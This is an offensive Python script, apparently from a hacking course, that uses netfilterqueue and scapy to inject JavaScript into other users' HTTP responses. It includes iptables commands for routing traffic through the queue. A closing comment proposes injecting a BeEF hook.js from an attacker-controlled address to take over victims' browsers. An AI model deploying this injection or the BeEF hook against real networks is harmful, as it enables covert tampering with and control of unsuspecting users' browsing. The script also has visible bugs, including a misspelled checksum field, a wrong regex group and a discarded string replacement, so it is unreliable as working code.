#You have to pass all the packet through the queue from your pc:
#>> $ iptables --flush
#>> $ iptables -I FORWARD -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load =load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].shksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = "<script>alert('test');</script>"
            load = scapy_packet[scapy.Raw].load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(:?Content-length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


# You can use the BEEF server to hook someone's browser and inject you code
# by replacing the injection_code return by the beef
# ex: Injection_code = '<script src="http://10.20.14.213:3000/hook.js"></script>'